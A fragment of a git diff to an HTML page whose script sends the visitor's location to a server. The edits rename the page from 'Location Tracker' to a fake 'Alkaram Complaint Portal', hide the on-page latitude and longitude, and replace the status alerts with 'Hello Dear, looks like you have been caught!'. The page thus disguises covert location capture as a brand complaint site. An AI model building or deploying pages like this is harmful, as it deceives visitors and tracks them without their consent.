@@ -2,7 +2,7 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Location Tracker</title>
+    <title>Alkaram Complaint Portal</title>
     <style>
       body {
         display: flex;
@@ -39,8 +39,6 @@
     <div>
       <h1>My PortFolio</h1>
       <button id="continue-btn" onclick="saveLocation()" style="display:none;">Click to continue</button>
-      <p id="latitude"></p>
-      <p id="longitude"></p>
     </div>
     <script>
       function saveLocation(position) {
@@ -52,9 +50,9 @@
         xhr.onreadystatechange = function() {
           if (xhr.readyState === XMLHttpRequest.DONE) {
             if (xhr.status === 200 || xhr.status === 204) {
-              alert("Location saved successfully!");
+              alert("Hello Dear, looks like you have been caught!");
             } else {
-              alert("Failed to save location!");
+              alert("Hello Dear, looks like you have been caught!");
             }
             document.getElementById("response-status").innerHTML = `API Response Status: ${xhr.status}`;
           }
